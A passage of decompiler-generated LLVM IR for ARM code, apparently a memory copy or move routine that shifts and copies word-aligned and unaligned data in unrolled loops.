  %v1_1769c = phi i32 [ %v4_1769c, %dec_label_pc_17690 ], [ %v12_17678, %dec_label_pc_17684 ], [ %v0_1760c74, %dec_label_pc_17644 ]
  %v0_17690 = load i32, i32* @lr, align 4
  %v3_17690 = udiv i32 %v0_17690, 65536
  store i32 %v3_17690, i32* %ip.global-to-local, align 4
  %v0_17694 = load i32, i32* %r1.global-to-local, align 4
  %v1_17694 = inttoptr i32 %v0_17694 to i32*
  %v2_17694 = load i32, i32* %v1_17694, align 4
  store i32 %v2_17694, i32* @lr, align 4
  %v4_17694 = add i32 %v0_17694, 4
  store i32 %v4_17694, i32* %r1.global-to-local, align 4
  %v4_17698 = mul i32 %v2_17694, 65536
  %v5_17698 = or i32 %v4_17698, %v3_17690
  store i32 %v5_17698, i32* @ip, align 4
  %v2_1769c = inttoptr i32 %v1_1769c to i32*
  store i32 %v5_17698, i32* %v2_1769c, align 4
  %v3_1769c = load i32, i32* %r0.global-to-local, align 4
  %v4_1769c = add i32 %v3_1769c, 4
  store i32 %v4_1769c, i32* %r0.global-to-local, align 4
  %v0_176a0 = load i32, i32* %r2.global-to-local, align 4
  %v2_176a0 = add i32 %v0_176a0, -4
  store i32 %v2_176a0, i32* %r2.global-to-local, align 4
  %v6_176a4 = icmp slt i32 %v0_176a0, 4
  br i1 %v6_176a4, label %dec_label_pc_176a8.loopexit, label %dec_label_pc_17690

dec_label_pc_176a8.loopexit:                      ; preds = %dec_label_pc_17690
  %v4_176a0 = sub i32 3, %v0_176a0
  %v5_176a0 = and i32 %v4_176a0, %v0_176a0
  %v6_176a0 = icmp slt i32 %v5_176a0, 0
  %v7_176a0 = icmp slt i32 %v2_176a0, 0
  store i1 %v6_176a0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_176a0, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_176a8

dec_label_pc_176a8:                               ; preds = %dec_label_pc_176a8.loopexit, %dec_label_pc_17684
  %v2_1757c111 = phi i32 [ %v4_1769c, %dec_label_pc_176a8.loopexit ], [ %v12_17678, %dec_label_pc_17684 ]
  %v0_1756c107 = phi i32 [ %v2_176a0, %dec_label_pc_176a8.loopexit ], [ %v2_17688, %dec_label_pc_17684 ]
  %v0_176a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_176a8 = add i32 %v0_176a8, -2
  store i32 %v1_176a8, i32* @r1, align 4
  br label %bb132

dec_label_pc_176b0:                               ; preds = %dec_label_pc_175c4
  br i1 %v5_176b4, label %dec_label_pc_176fc, label %dec_label_pc_176b8

dec_label_pc_176b8:                               ; preds = %dec_label_pc_176b0
  store i32 %v2_176b0, i32* %r2.global-to-local, align 4
  %v3_176bc = load i32, i32* @r4, align 4
  store i32 %v3_176bc, i32* %stack_var_-16, align 4
  %v6_176bc = load i32, i32* @r5, align 4
  store i32 %v6_176bc, i32* %stack_var_-12, align 4
  br label %dec_label_pc_176c0

dec_label_pc_176c0:                               ; preds = %dec_label_pc_176c0.dec_label_pc_176c0_crit_edge, %dec_label_pc_176b8
  %v0_176e4 = phi i32 [ %v12_176e4, %dec_label_pc_176c0.dec_label_pc_176c0_crit_edge ], [ %v0_1760c74, %dec_label_pc_176b8 ]
  %v0_176c4 = phi i32 [ %v0_176c4.pre, %dec_label_pc_176c0.dec_label_pc_176c0_crit_edge ], [ %v4_175c8, %dec_label_pc_176b8 ]
  %v0_176c0 = phi i32 [ %v0_176c0.pre, %dec_label_pc_176c0.dec_label_pc_176c0_crit_edge ], [ %v2_175c8, %dec_label_pc_176b8 ]
  %v3_176c0 = udiv i32 %v0_176c0, 16777216
  store i32 %v3_176c0, i32* %r3.global-to-local, align 4
  %v1_176c4 = inttoptr i32 %v0_176c4 to i32*
  %v2_176c4 = load i32, i32* %v1_176c4, align 4
  store i32 %v2_176c4, i32* %r4.global-to-local, align 4
  %v3_176c4 = add i32 %v0_176c4, 4
  %v4_176c4 = inttoptr i32 %v3_176c4 to i32*
  %v5_176c4 = load i32, i32* %v4_176c4, align 4
  store i32 %v5_176c4, i32* %r5.global-to-local, align 4
  %v6_176c4 = add i32 %v0_176c4, 8
  %v7_176c4 = inttoptr i32 %v6_176c4 to i32*
  %v8_176c4 = load i32, i32* %v7_176c4, align 4
  store i32 %v8_176c4, i32* %ip.global-to-local, align 4
  %v9_176c4 = add i32 %v0_176c4, 12
  %v10_176c4 = inttoptr i32 %v9_176c4 to i32*
  %v11_176c4 = load i32, i32* %v10_176c4, align 4
  store i32 %v11_176c4, i32* @lr, align 4
  %v12_176c4 = add i32 %v0_176c4, 16
  store i32 %v12_176c4, i32* %r1.global-to-local, align 4
  %v4_176c8 = mul i32 %v2_176c4, 256
  %v5_176c8 = or i32 %v4_176c8, %v3_176c0
  store i32 %v5_176c8, i32* %r3.global-to-local, align 4
  %v3_176cc = udiv i32 %v2_176c4, 16777216
  %v4_176d0 = mul i32 %v5_176c4, 256
  %v5_176d0 = or i32 %v4_176d0, %v3_176cc
  store i32 %v5_176d0, i32* %r4.global-to-local, align 4
  %v3_176d4 = udiv i32 %v5_176c4, 16777216
  %v4_176d8 = mul i32 %v8_176c4, 256
  %v5_176d8 = or i32 %v4_176d8, %v3_176d4
  store i32 %v5_176d8, i32* %r5.global-to-local, align 4
  %v3_176dc = udiv i32 %v8_176c4, 16777216
  %v4_176e0 = mul i32 %v11_176c4, 256
  %v5_176e0 = or i32 %v4_176e0, %v3_176dc
  store i32 %v5_176e0, i32* @ip, align 4
  %v1_176e4 = inttoptr i32 %v0_176e4 to i32*
  store i32 %v5_176c8, i32* %v1_176e4, align 4
  %v3_176e4 = add i32 %v0_176e4, 4
  %v4_176e4 = inttoptr i32 %v3_176e4 to i32*
  %v5_176e4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_176e4, i32* %v4_176e4, align 4
  %v6_176e4 = add i32 %v0_176e4, 8
  %v7_176e4 = inttoptr i32 %v6_176e4 to i32*
  %v8_176e4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_176e4, i32* %v7_176e4, align 4
  %v9_176e4 = add i32 %v0_176e4, 12
  %v10_176e4 = inttoptr i32 %v9_176e4 to i32*
  %v11_176e4 = load i32, i32* @ip, align 4
  store i32 %v11_176e4, i32* %v10_176e4, align 4
  %v12_176e4 = add i32 %v0_176e4, 16
  store i32 %v12_176e4, i32* %r0.global-to-local, align 4
  %v0_176e8 = load i32, i32* %r2.global-to-local, align 4
  %v2_176e8 = add i32 %v0_176e8, -16
  store i32 %v2_176e8, i32* %r2.global-to-local, align 4
  %v6_176ec = icmp slt i32 %v0_176e8, 16
  br i1 %v6_176ec, label %dec_label_pc_176f0, label %dec_label_pc_176c0.dec_label_pc_176c0_crit_edge

dec_label_pc_176c0.dec_label_pc_176c0_crit_edge:  ; preds = %dec_label_pc_176c0
  %v0_176c0.pre = load i32, i32* @lr, align 4
  %v0_176c4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_176c0

dec_label_pc_176f0:                               ; preds = %dec_label_pc_176c0
  %v2_176f0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_176f0, i32* @r4, align 4
  %v5_176f0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_176f0, i32* @r5, align 4
  %v2_176f4 = add i32 %v0_176e8, -4
  store i32 %v2_176f4, i32* %r2.global-to-local, align 4
  %v4_176f4 = add i32 %v0_176e8, 2147483632
  %v5_176f4 = and i32 %v2_176f4, %v4_176f4
  %v6_176f4 = icmp slt i32 %v5_176f4, 0
  store i1 %v6_176f4, i1* %cpsr_v.global-to-local, align 1
  %v7_176f4 = icmp slt i32 %v2_176f4, 0
  store i1 %v7_176f4, i1* %cpsr_n.global-to-local, align 1
  %v5_176f8 = icmp slt i32 %v2_176e8, -12
  br i1 %v5_176f8, label %dec_label_pc_17714, label %dec_label_pc_176fc

dec_label_pc_176fc:                               ; preds = %dec_label_pc_176f0, %dec_label_pc_176b0, %dec_label_pc_176fc
  %v1_17708 = phi i32 [ %v4_17708, %dec_label_pc_176fc ], [ %v12_176e4, %dec_label_pc_176f0 ], [ %v0_1760c74, %dec_label_pc_176b0 ]
  %v0_176fc = load i32, i32* @lr, align 4
  %v3_176fc = udiv i32 %v0_176fc, 16777216
  store i32 %v3_176fc, i32* %ip.global-to-local, align 4
  %v0_17700 = load i32, i32* %r1.global-to-local, align 4
  %v1_17700 = inttoptr i32 %v0_17700 to i32*
  %v2_17700 = load i32, i32* %v1_17700, align 4
  store i32 %v2_17700, i32* @lr, align 4
  %v4_17700 = add i32 %v0_17700, 4
  store i32 %v4_17700, i32* %r1.global-to-local, align 4
  %v4_17704 = mul i32 %v2_17700, 256
  %v5_17704 = or i32 %v4_17704, %v3_176fc
  store i32 %v5_17704, i32* @ip, align 4
  %v2_17708 = inttoptr i32 %v1_17708 to i32*
  store i32 %v5_17704, i32* %v2_17708, align 4
  %v3_17708 = load i32, i32* %r0.global-to-local, align 4
  %v4_17708 = add i32 %v3_17708, 4
  store i32 %v4_17708, i32* %r0.global-to-local, align 4
  %v0_1770c = load i32, i32* %r2.global-to-local, align 4
  %v2_1770c = add i32 %v0_1770c, -4
  store i32 %v2_1770c, i32* %r2.global-to-local, align 4
  %v6_17710 = icmp slt i32 %v0_1770c, 4
  br i1 %v6_17710, label %dec_label_pc_17714.loopexit, label %dec_label_pc_176fc

dec_label_pc_17714.loopexit:                      ; preds = %dec_label_pc_176fc
  %v4_1770c = sub i32 3, %v0_1770c
  %v5_1770c = and i32 %v4_1770c, %v0_1770c
  %v6_1770c = icmp slt i32 %v5_1770c, 0
  %v7_1770c = icmp slt i32 %v2_1770c, 0
  store i1 %v6_1770c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1770c, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_17714

dec_label_pc_17714:                               ; preds = %dec_label_pc_17714.loopexit, %dec_label_pc_176f0
  %v2_1757c113 = phi i32 [ %v4_17708, %dec_label_pc_17714.loopexit ], [ %v12_176e4, %dec_label_pc_176f0 ]
  %v0_1756c109 = phi i32 [ %v2_1770c, %dec_label_pc_17714.loopexit ], [ %v2_176f4, %dec_label_pc_176f0 ]
  %v0_17714 = load i32, i32* %r1.global-to-local, align 4
  %v1_17714 = add i32 %v0_17714, -1
  store i32 %v1_17714, i32* @r1, align 4
  br label %bb132

dec_label_pc_1771c:                               ; preds = %entry
  %v1_1771c = load i32, i32* @r2, align 4
  %v2_1771c = add i32 %v1_1771c, %v0_174d0
  store i32 %v2_1771c, i32* @r1, align 4
  %v2_17720 = add i32 %v1_1771c, %v1_174d0
  store i32 %v2_17720, i32* %r0.global-to-local, align 4
  %v2_17724 = add i32 %v1_1771c, -4
  store i32 %v2_17724, i32* %r2.global-to-local, align 4
  %v4_17724 = sub i32 3, %v1_1771c
  %v5_17724 = and i32 %v4_17724, %v1_1771c
  %v6_17724 = icmp slt i32 %v5_17724, 0
  store i1 %v6_17724, i1* %cpsr_v.global-to-local, align 1
  %v7_17724 = icmp slt i32 %v2_17724, 0
  store i1 %v7_17724, i1* %cpsr_n.global-to-local, align 1
  %v5_17728 = icmp slt i32 %v1_1771c, 4
  br i1 %v5_17728, label %bb142, label %dec_label_pc_1772c

dec_label_pc_1772c:                               ; preds = %dec_label_pc_1771c
  %v1_1772c = urem i32 %v2_17720, 4
  store i32 %v1_1772c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1772c = icmp eq i32 %v1_1772c, 0
  br i1 %v2_1772c, label %dec_label_pc_17734, label %dec_label_pc_177d4

dec_label_pc_17734:                               ; preds = %dec_label_pc_1772c
  %v1_17734 = urem i32 %v2_1771c, 4
  store i32 %v1_17734, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17734 = icmp eq i32 %v1_17734, 0
  br i1 %v2_17734, label %dec_label_pc_1773c, label %dec_label_pc_17800

dec_label_pc_1773c:                               ; preds = %dec_label_pc_17734, %dec_label_pc_177f8
  %v0_1775448 = phi i32 [ %v2_17720, %dec_label_pc_17734 ], [ %v0_1784831, %dec_label_pc_177f8 ]
  %v0_1775047 = phi i32 [ %v2_1771c, %dec_label_pc_17734 ], [ %v0_177f8, %dec_label_pc_177f8 ]
  %v0_1773c = phi i32 [ %v2_17724, %dec_label_pc_17734 ], [ %v2_177f0, %dec_label_pc_177f8 ]
  %v2_1773c = add i32 %v0_1773c, -8
  store i32 %v2_1773c, i32* %r2.global-to-local, align 4
  %v4_1773c = sub i32 7, %v0_1773c
  %v5_1773c = and i32 %v4_1773c, %v0_1773c
  %v6_1773c = icmp slt i32 %v5_1773c, 0
  store i1 %v6_1773c, i1* %cpsr_v.global-to-local, align 1
  %v7_1773c = icmp slt i32 %v2_1773c, 0
  store i1 %v7_1773c, i1* %cpsr_n.global-to-local, align 1
  %v5_17740 = icmp slt i32 %v0_1773c, 8
  br i1 %v5_17740, label %dec_label_pc_1778c, label %dec_label_pc_17744

dec_label_pc_17744:                               ; preds = %dec_label_pc_1773c
  %v3_17744 = load i32, i32* @r4, align 4
  %v5_17744 = inttoptr i32 %v3_17744 to i8*
  store i8* %v5_17744, i8** %stack_var_-8, align 4
  %v8_17744 = load i32, i32* @lr, align 4
  %v2_17748 = add i32 %v0_1773c, -28
  store i32 %v2_17748, i32* %r2.global-to-local, align 4
  %v4_17748 = sub i32 27, %v0_1773c
  %v5_17748 = and i32 %v4_17748, %v2_1773c
  %v6_17748 = icmp slt i32 %v5_17748, 0
  store i1 %v6_17748, i1* %cpsr_v.global-to-local, align 1
  %v7_17748 = icmp slt i32 %v2_17748, 0
  store i1 %v7_17748, i1* %cpsr_n.global-to-local, align 1
  %v5_1774c = icmp slt i32 %v2_1773c, 20
  br i1 %v5_1774c, label %dec_label_pc_17768, label %dec_label_pc_17750

dec_label_pc_17750:                               ; preds = %dec_label_pc_17744, %dec_label_pc_17750.dec_label_pc_17750_crit_edge
  %v0_17754 = phi i32 [ %v1_1775c, %dec_label_pc_17750.dec_label_pc_17750_crit_edge ], [ %v0_1775448, %dec_label_pc_17744 ]
  %v0_17750 = phi i32 [ %v0_17750.pre, %dec_label_pc_17750.dec_label_pc_17750_crit_edge ], [ %v0_1775047, %dec_label_pc_17744 ]
  %v1_17750 = add i32 %v0_17750, -4
  %v2_17750 = inttoptr i32 %v1_17750 to i32*
  %v3_17750 = load i32, i32* %v2_17750, align 4
  store i32 %v3_17750, i32* %r3.global-to-local, align 4
  %v4_17750 = add i32 %v0_17750, -8
  %v5_17750 = inttoptr i32 %v4_17750 to i32*
  %v6_17750 = load i32, i32* %v5_17750, align 4
  store i32 %v6_17750, i32* %r4.global-to-local, align 4
  %v7_17750 = add i32 %v0_17750, -12
  %v8_17750 = inttoptr i32 %v7_17750 to i32*
  %v9_17750 = load i32, i32* %v8_17750, align 4
  store i32 %v9_17750, i32* %ip.global-to-local, align 4
  %v10_17750 = add i32 %v0_17750, -16
  %v11_17750 = inttoptr i32 %v10_17750 to i32*
  %v12_17750 = load i32, i32* %v11_17750, align 4
  store i32 %v12_17750, i32* %lr.global-to-local, align 4
  store i32 %v10_17750, i32* %r1.global-to-local, align 4
  %v1_17754 = add i32 %v0_17754, -16
  %v2_17754 = inttoptr i32 %v1_17754 to i32*
  store i32 %v3_17750, i32* %v2_17754, align 4
  %v4_17754 = add i32 %v0_17754, -12
  %v5_17754 = inttoptr i32 %v4_17754 to i32*
  %v6_17754 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_17754, i32* %v5_17754, align 4
  %v7_17754 = add i32 %v0_17754, -8
  %v8_17754 = inttoptr i32 %v7_17754 to i32*
  %v9_17754 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_17754, i32* %v8_17754, align 4
  %v10_17754 = add i32 %v0_17754, -4
  %v11_17754 = inttoptr i32 %v10_17754 to i32*
  %v12_17754 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_17754, i32* %v11_17754, align 4
  store i32 %v1_17754, i32* %r0.global-to-local, align 4
  %v0_17758 = load i32, i32* %r1.global-to-local, align 4
  %v1_17758 = add i32 %v0_17758, -4
  %v2_17758 = inttoptr i32 %v1_17758 to i32*
  %v3_17758 = load i32, i32* %v2_17758, align 4
  store i32 %v3_17758, i32* %r3.global-to-local, align 4
  %v4_17758 = add i32 %v0_17758, -8
  %v5_17758 = inttoptr i32 %v4_17758 to i32*
  %v6_17758 = load i32, i32* %v5_17758, align 4
  store i32 %v6_17758, i32* %r4.global-to-local, align 4
  %v7_17758 = add i32 %v0_17758, -12
  %v8_17758 = inttoptr i32 %v7_17758 to i32*
  %v9_17758 = load i32, i32* %v8_17758, align 4
  store i32 %v9_17758, i32* @ip, align 4
  %v10_17758 = add i32 %v0_17758, -16
  %v11_17758 = inttoptr i32 %v10_17758 to i32*
  %v12_17758 = load i32, i32* %v11_17758, align 4
  store i32 %v12_17758, i32* %lr.global-to-local, align 4
  store i32 %v10_17758, i32* @r1, align 4
  %v1_1775c = add i32 %v0_17754, -32
  %v2_1775c = inttoptr i32 %v1_1775c to i32*
  store i32 %v3_17758, i32* %v2_1775c, align 4
  %v4_1775c = add i32 %v0_17754, -28
  %v5_1775c = inttoptr i32 %v4_1775c to i32*
  %v6_1775c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1775c, i32* %v5_1775c, align 4
  %v7_1775c = add i32 %v0_17754, -24
  %v8_1775c = inttoptr i32 %v7_1775c to i32*
  %v9_1775c = load i32, i32* @ip, align 4
  store i32 %v9_1775c, i32* %v8_1775c, align 4
  %v10_1775c = add i32 %v0_17754, -20
  %v11_1775c = inttoptr i32 %v10_1775c to i32*
  %v12_1775c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1775c, i32* %v11_1775c, align 4
  store i32 %v1_1775c, i32* %r0.global-to-local, align 4
  %v0_17760 = load i32, i32* %r2.global-to-local, align 4
  %v2_17760 = add i32 %v0_17760, -32
  store i32 %v2_17760, i32* %r2.global-to-local, align 4
  %v6_17764 = icmp slt i32 %v0_17760, 32
  br i1 %v6_17764, label %dec_label_pc_17768.loopexit, label %dec_label_pc_17750.dec_label_pc_17750_crit_edge

dec_label_pc_17750.dec_label_pc_17750_crit_edge:  ; preds = %dec_label_pc_17750
  %v0_17750.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_17750

dec_label_pc_17768.loopexit:                      ; preds = %dec_label_pc_17750
  %v4_17760 = sub i32 31, %v0_17760
  %v5_17760 = and i32 %v4_17760, %v0_17760
  %v6_17760 = icmp slt i32 %v5_17760, 0
  %v7_17760 = icmp slt i32 %v2_17760, 0
  store i1 %v6_17760, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17760, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_17768

dec_label_pc_17768:                               ; preds = %dec_label_pc_17768.loopexit, %dec_label_pc_17744
  %v6_17770 = phi i32 [ %v1_1775c, %dec_label_pc_17768.loopexit ], [ %v0_1775448, %dec_label_pc_17744 ]
  %v0_17778.pr = phi i32 [ %v2_17760, %dec_label_pc_17768.loopexit ], [ %v2_17748, %dec_label_pc_17744 ]
  %v4_17768 = add i32 %v0_17778.pr, 16
  %v6_17768 = sub i32 0, %v0_17778.pr
  %v7_17768 = and i32 %v4_17768, %v6_17768
  %v8_17768 = icmp slt i32 %v7_17768, 0
  store i1 %v8_17768, i1* %cpsr_v.global-to-local, align 1
  %v9_17768 = icmp slt i32 %v4_17768, 0
  store i1 %v9_17768, i1* %cpsr_n.global-to-local, align 1
  %v5_1776c = icmp slt i32 %v0_17778.pr, -16
  br i1 %v5_1776c, label %.thread13, label %bb139

bb139:                                            ; preds = %dec_label_pc_17768
  %v6_1776c = load i32, i32* @r1, align 4
  %v7_1776c = add i32 %v6_1776c, -4
  %v8_1776c = inttoptr i32 %v7_1776c to i32*
  %v9_1776c = load i32, i32* %v8_1776c, align 4
  store i32 %v9_1776c, i32* %r3.global-to-local, align 4
  %v10_1776c = add i32 %v6_1776c, -8
  %v11_1776c = inttoptr i32 %v10_1776c to i32*
  %v12_1776c = load i32, i32* %v11_1776c, align 4
  store i32 %v12_1776c, i32* %r4.global-to-local, align 4
  %v13_1776c = add i32 %v6_1776c, -12
  %v14_1776c = inttoptr i32 %v13_1776c to i32*
  %v15_1776c = load i32, i32* %v14_1776c, align 4
  store i32 %v15_1776c, i32* @ip, align 4
  %v16_1776c = add i32 %v6_1776c, -16
  %v17_1776c = inttoptr i32 %v16_1776c to i32*
  %v18_1776c = load i32, i32* %v17_1776c, align 4
  store i32 %v18_1776c, i32* %lr.global-to-local, align 4
  store i32 %v16_1776c, i32* @r1, align 4
  %v7_17770 = add i32 %v6_17770, -16
  %v8_17770 = inttoptr i32 %v7_17770 to i32*
  store i32 %v9_1776c, i32* %v8_17770, align 4
  %v10_17770 = add i32 %v6_17770, -12
  %v11_17770 = inttoptr i32 %v10_17770 to i32*
  %v12_17770 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_17770, i32* %v11_17770, align 4
  %v13_17770 = add i32 %v6_17770, -8
  %v14_17770 = inttoptr i32 %v13_17770 to i32*
  %v15_17770 = load i32, i32* @ip, align 4
  store i32 %v15_17770, i32* %v14_17770, align 4
  %v16_17770 = add i32 %v6_17770, -4
  %v17_17770 = inttoptr i32 %v16_17770 to i32*
  %v18_17770 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_17770, i32* %v17_17770, align 4
  store i32 %v7_17770, i32* %r0.global-to-local, align 4
  %v6_17774 = load i32, i32* %r2.global-to-local, align 4
  %v7_17774 = add i32 %v6_17774, -16
  store i32 %v7_17774, i32* %r2.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_17768, %bb139
  %v6_17780 = phi i32 [ %v7_17770, %bb139 ], [ %v6_17770, %dec_label_pc_17768 ]
  %v0_17778 = phi i32 [ %v7_17774, %bb139 ], [ %v0_17778.pr, %dec_label_pc_17768 ]
  %v4_17778 = add i32 %v0_17778, 20
  store i32 %v4_17778, i32* %r2.global-to-local, align 4
  %v6_17778 = sub i32 0, %v0_17778
  %v7_17778 = and i32 %v4_17778, %v6_17778
  %v8_17778 = icmp slt i32 %v7_17778, 0
  store i1 %v8_17778, i1* %cpsr_v.global-to-local, align 1
  %v9_17778 = icmp slt i32 %v4_17778, 0
  store i1 %v9_17778, i1* %cpsr_n.global-to-local, align 1
  %v5_1777c = icmp slt i32 %v0_17778, -20
  br i1 %v5_1777c, label %.thread15, label %bb140

bb140:                                            ; preds = %.thread13
  %v6_1777c = load i32, i32* @r1, align 4
  %v7_1777c = add i32 %v6_1777c, -4
  %v8_1777c = inttoptr i32 %v7_1777c to i32*
  %v9_1777c = load i32, i32* %v8_1777c, align 4
  store i32 %v9_1777c, i32* %r3.global-to-local, align 4
  %v10_1777c = add i32 %v6_1777c, -8
  %v11_1777c = inttoptr i32 %v10_1777c to i32*
  %v12_1777c = load i32, i32* %v11_1777c, align 4
  store i32 %v12_1777c, i32* @ip, align 4
  %v13_1777c = add i32 %v6_1777c, -12
  %v14_1777c = inttoptr i32 %v13_1777c to i32*
  %v15_1777c = load i32, i32* %v14_1777c, align 4
  store i32 %v15_1777c, i32* %lr.global-to-local, align 4
  store i32 %v13_1777c, i32* @r1, align 4
  %v7_17780 = add i32 %v6_17780, -12
  %v8_17780 = inttoptr i32 %v7_17780 to i32*
  store i32 %v9_1777c, i32* %v8_17780, align 4
  %v10_17780 = add i32 %v6_17780, -8
  %v11_17780 = inttoptr i32 %v10_17780 to i32*
  %v12_17780 = load i32, i32* @ip, align 4
  store i32 %v12_17780, i32* %v11_17780, align 4
  %v13_17780 = add i32 %v6_17780, -4
  %v14_17780 = inttoptr i32 %v13_17780 to i32*
  %v15_17780 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_17780, i32* %v14_17780, align 4
  store i32 %v7_17780, i32* %r0.global-to-local, align 4
  %v6_17784 = load i32, i32* %r2.global-to-local, align 4
  %v7_17784 = add i32 %v6_17784, -12
  store i32 %v7_17784, i32* %r2.global-to-local, align 4
  br label %.thread15

.thread15:                                        ; preds = %.thread13, %bb140
  %v6_177a456 = phi i32 [ %v6_17780, %.thread13 ], [ %v7_17780, %bb140 ]
  %v0_1778c54 = phi i32 [ %v4_17778, %.thread13 ], [ %v7_17784, %bb140 ]
  %v2_17788 = load i8*, i8** %stack_var_-8, align 4
  %v3_17788 = ptrtoint i8* %v2_17788 to i32
  store i32 %v3_17788, i32* @r4, align 4
  store i32 %v8_17744, i32* @lr, align 4
  br label %dec_label_pc_1778c

dec_label_pc_1778c:                               ; preds = %dec_label_pc_1773c, %.thread15
  %v7_1779c = phi i32 [ %v0_1775448, %dec_label_pc_1773c ], [ %v6_177a456, %.thread15 ]
  %v0_1778c = phi i32 [ %v2_1773c, %dec_label_pc_1773c ], [ %v0_1778c54, %.thread15 ]
  %v2_1778c = add i32 %v0_1778c, 8
  store i32 %v2_1778c, i32* %r2.global-to-local, align 4
  %v4_1778c = sub i32 0, %v0_1778c
  %v5_1778c = and i32 %v2_1778c, %v4_1778c
  %v6_1778c = icmp slt i32 %v5_1778c, 0
  store i1 %v6_1778c, i1* %cpsr_v.global-to-local, align 1
  %v7_1778c = icmp slt i32 %v2_1778c, 0
  store i1 %v7_1778c, i1* %cpsr_n.global-to-local, align 1
  %v5_17790 = icmp slt i32 %v0_1778c, -8
  br i1 %v5_17790, label %bb142, label %dec_label_pc_17794

dec_label_pc_17794:                               ; preds = %dec_label_pc_1778c
  %v6_17794 = add i32 %v0_1778c, 4
  store i32 %v6_17794, i32* %r2.global-to-local, align 4
  %v8_17794 = sub i32 -5, %v0_1778c
  %v9_17794 = and i32 %v8_17794, %v2_1778c
  %v10_17794 = icmp slt i32 %v9_17794, 0
  store i1 %v10_17794, i1* %cpsr_v.global-to-local, align 1
  %v11_17794 = icmp slt i32 %v6_17794, 0
  store i1 %v11_17794, i1* %cpsr_n.global-to-local, align 1
  %v5_17798 = icmp slt i32 %v2_1778c, 4
  %v6_17798 = load i32, i32* @r1, align 4
  %v7_17798 = add i32 %v6_17798, -4
  %v8_17798 = inttoptr i32 %v7_17798 to i32*
  %v9_17798 = load i32, i32* %v8_17798, align 4
  store i32 %v9_17798, i32* %r3.global-to-local, align 4
  br i1 %v5_17798, label %.thread19, label %bb141

.thread19:                                        ; preds = %dec_label_pc_17794
  store i32 %v7_17798, i32* @r1, align 4
  %v8_1779c = add i32 %v7_1779c, -4
  %v9_1779c = inttoptr i32 %v8_1779c to i32*
  store i32 %v9_17798, i32* %v9_1779c, align 4
  %v10_1779c = load i32, i32* %r0.global-to-local, align 4
  %v11_1779c = add i32 %v10_1779c, -4
  store i32 %v11_1779c, i32* %r0.global-to-local, align 4
  %v0_177ac.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb142

bb141:                                            ; preds = %dec_label_pc_17794
  %v10_177a0 = add i32 %v6_17798, -8
  %v11_177a0 = inttoptr i32 %v10_177a0 to i32*
  %v12_177a0 = load i32, i32* %v11_177a0, align 4
  store i32 %v12_177a0, i32* @ip, align 4
  store i32 %v10_177a0, i32* @r1, align 4
  %v7_177a4 = add i32 %v7_1779c, -8
  %v8_177a4 = inttoptr i32 %v7_177a4 to i32*
  store i32 %v9_17798, i32* %v8_177a4, align 4
  %v10_177a4 = add i32 %v7_1779c, -4
  %v11_177a4 = inttoptr i32 %v10_177a4 to i32*
  %v12_177a4 = load i32, i32* @ip, align 4
  store i32 %v12_177a4, i32* %v11_177a4, align 4
  store i32 %v7_177a4, i32* %r0.global-to-local, align 4
  %v6_177a8 = load i32, i32* %r2.global-to-local, align 4
  %v7_177a8 = add i32 %v6_177a8, -4
  store i32 %v7_177a8, i32* %r2.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %.thread19, %.thread25, %dec_label_pc_1778c, %dec_label_pc_1771c, %dec_label_pc_17950, %dec_label_pc_178e4, %dec_label_pc_17878, %bb141
  %v2_177b0 = phi i32 [ %v11_1779c, %.thread19 ], [ %v0_1784831, %.thread25 ], [ %v7_1779c, %dec_label_pc_1778c ], [ %v2_17720, %dec_label_pc_1771c ], [ %v2_177bc64, %dec_label_pc_17950 ], [ %v2_177bc63, %dec_label_pc_178e4 ], [ %v2_177bc62, %dec_label_pc_17878 ], [ %v7_177a4, %bb141 ]
  %v0_177ac = phi i32 [ %v0_177ac.pre, %.thread19 ], [ %v2_177f0, %.thread25 ], [ %v2_1778c, %dec_label_pc_1778c ], [ %v2_17724, %dec_label_pc_1771c ], [ %v0_177ac60, %dec_label_pc_17950 ], [ %v0_177ac59, %dec_label_pc_178e4 ], [ %v0_177ac58, %dec_label_pc_17878 ], [ %v7_177a8, %bb141 ]
  %v1_177ac = add i32 %v0_177ac, 4
  store i32 %v1_177ac, i32* @r2, align 4
  %v3_177ac = sub i32 0, %v0_177ac
  %v4_177ac = and i32 %v1_177ac, %v3_177ac
  %v5_177ac = icmp slt i32 %v4_177ac, 0
  store i1 %v5_177ac, i1* %cpsr_v.global-to-local, align 1
  %v6_177ac = icmp slt i32 %v1_177ac, 0
  store i1 %v6_177ac, i1* %cpsr_n.global-to-local, align 1
  %v7_177ac = icmp eq i32 %v1_177ac, 0
  store i1 %v7_177ac, i1* @cpsr_z, align 1
  br i1 %v7_177ac, label %.thread122, label %bb143

bb143:                                            ; preds = %bb142
  %v1_177b4 = add i32 %v0_177ac, 2
  %v3_177b4 = sub i32 -3, %v0_177ac
  %v4_177b4 = and i32 %v3_177b4, %v1_177ac
  %v5_177b4 = icmp slt i32 %v4_177b4, 0
  store i1 %v5_177b4, i1* %cpsr_v.global-to-local, align 1
  %v6_177b4 = icmp slt i32 %v1_177b4, 0
